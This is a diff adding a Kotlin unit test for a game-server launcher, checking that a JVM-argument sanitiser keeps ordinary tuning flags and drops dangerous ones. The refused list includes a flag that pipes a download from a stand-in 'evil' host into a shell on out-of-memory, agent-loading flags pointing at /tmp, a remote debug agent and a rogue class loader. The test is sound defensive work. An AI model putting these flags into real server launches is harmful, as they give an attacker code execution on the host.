@@ -30,6 +30,28 @@ class ServerLaunchTest {
     }
 
     @Test
+    fun `drops jvm flags that would run a command or load other code`() {
+        val wanted = listOf("-XX:+UseG1GC", "-XX:MaxGCPauseMillis=200", "-Dusing.aikars.flags=https://mcflags.emc.gs", "-Xss2M", "-Djava.security.manager=allow")
+        val refused = listOf(
+            "-XX:OnOutOfMemoryError=curl -s http://evil/x|sh",
+            "-XX:onerror=sh -c id",
+            "-javaagent:/tmp/a.jar",
+            "-agentpath:/tmp/a.so",
+            "-agentlib:jdwp=transport=dt_socket",
+            "-Xrunhprof",
+            "-XX:Flags=/tmp/flags",
+            "-XX:VMOptionsFile=/tmp/opts",
+            "--patch-module=java.base=/tmp/x",
+            "-Djava.system.class.loader=Evil",
+            "@/tmp/args",
+            "-jar",
+            "-cp"
+        )
+
+        assertEquals(wanted, ServerProcess.launchSafeJvmArgs(wanted + refused))
+    }
+
+    @Test
     fun `leaves nogui off a proxy`() {
         val command = ServerProcess.buildCommand("java", "velocity.jar", ServerSpec(software = "velocity"))
 
